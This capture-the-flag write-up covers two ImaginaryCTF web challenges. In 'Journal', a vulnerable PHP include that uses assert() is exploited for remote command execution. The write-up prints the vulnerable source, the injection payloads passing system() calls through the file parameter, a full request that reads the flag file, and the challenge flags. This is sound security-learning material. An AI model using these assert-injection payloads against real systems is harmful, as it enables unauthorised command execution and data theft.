Hello guys, I'm `0x1337` and last night I participated in ImaginaryCTF 

Even though I started really late i'm happy to have least solved some challenges

And in this writeup I'll go through the challenges which I solved

### Web
- Readme
- Journal
- PC2
- Crystals
- Readme2

### Reversing
- Unoriginal
- Rust
- BF
- Absolute Flag Checker
- Watchdog

### Pwn

### Web

#### Readme
![image](https://github.com/user-attachments/assets/83893b67-ce4e-4b9f-94f5-d449f57b339b)

We are given the web instance and a file sharing server which has a compressed archive
![image](https://github.com/user-attachments/assets/f3a804c0-ee26-4ce4-8081-22a17d73342f)

After downloading it I uncompressed it and got this
![image](https://github.com/user-attachments/assets/f3c6e762-d328-414c-af87-d3e05ed34d7f)

So that's the application source code

Opening it in VSCode I saw the flag in the `Dockerfile` 
![image](https://github.com/user-attachments/assets/d980e458-4cfa-4eb3-9ad7-a5f8a71465fc)

It seems this was unintended which lead to the release of `Readme2` i presume

In any case I got the flag

```
Flag: ictf{path_normalization_to_the_rescue}
```

#### Journal

After downloading the zip file from the file sharing server I uncompressed it which gave the source code
![image](https://github.com/user-attachments/assets/8765564e-ae62-48cb-bc62-34548ada272d)

You can ignore the `test.php` as it wasn't there initially (i created it for debugging0

Let's check out the source code but before that it's good practice to check the `Dockerfile`
![image](https://github.com/user-attachments/assets/92d25f25-1bbd-4e93-9b2c-f6b7f20ceff2)

Basically this Dockerfile would install `php:7-apache` then do some web server configuration

And what i mean by that is this:
- Setups the web server files
- Starts Apache HTTP Server in the foreground while setting specific environment variables and user/group permissions. 
- Randomize the flag file name

Ok at this point we know that the `flag.txt` file would be of a random name stored in `/`

That means we might need to get `RCE` to get the name and it's content

Moving on we can check the application source code which is `index.php`
![image](https://github.com/user-attachments/assets/fc9faa9d-7a84-4ec8-bf1b-16afea34e301)

```php
<?php

echo "<p>Welcome to my journal app!</p>";
echo "<p><a href=/?file=file1.txt>file1.txt</a></p>";
echo "<p><a href=/?file=file2.txt>file2.txt</a></p>";
echo "<p><a href=/?file=file3.txt>file3.txt</a></p>";
echo "<p><a href=/?file=file4.txt>file4.txt</a></p>";
echo "<p><a href=/?file=file5.txt>file5.txt</a></p>";
echo "<p>";

if (isset($_GET['file'])) {
  $file = $_GET['file'];
  $filepath = './files/' . $file;

  assert("strpos('$file', '..') === false") or die("Invalid file!");
// 
  if (file_exists($filepath)) {
    include($filepath);
  } else {
    echo 'File not found!';
  }
}

echo "</p>";

?>
```

The code isn't much and basically it would include any file passed to the `file` parameter considering it's valid

So this is an `LFI` sort of challenge!

But the issue here is that before it includes our file it would check for the occurrence of `..` in our input, and that's to prevent us from doing directory transversal

The odd thing here is that it uses `assert` for the check

And one issue about `assert` is that it basically does an `eval()` based on the string passed into it

Ok good we can leverage this to get `RCE` 

In order to do that we need to first escape the `strpos` call and here's how I did that

```
rce' and die(system(ls)) or '
```

I got that payload from [hacktricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert)

Doing that works and I got the current files in that directory

To get full command execution I used this:
![image](https://github.com/user-attachments/assets/3cb78497-2753-4913-8f84-d757cff22e90)

```
rce' and die(system($_GET['cmd'])) or '&cmd=ls -al
```

Now we can get the flag file name

And then we concatenate it :)

```
http://journal.chal.imaginaryctf.org/?file=rce' and die(system($_GET['cmd'])) or '&cmd=cat /flag-cARdaInFg6dD10uWQQgm.txt
```

Cool we got the flag

```
Flag: ictf{assertion_failed_e3106922feb13b10}
```
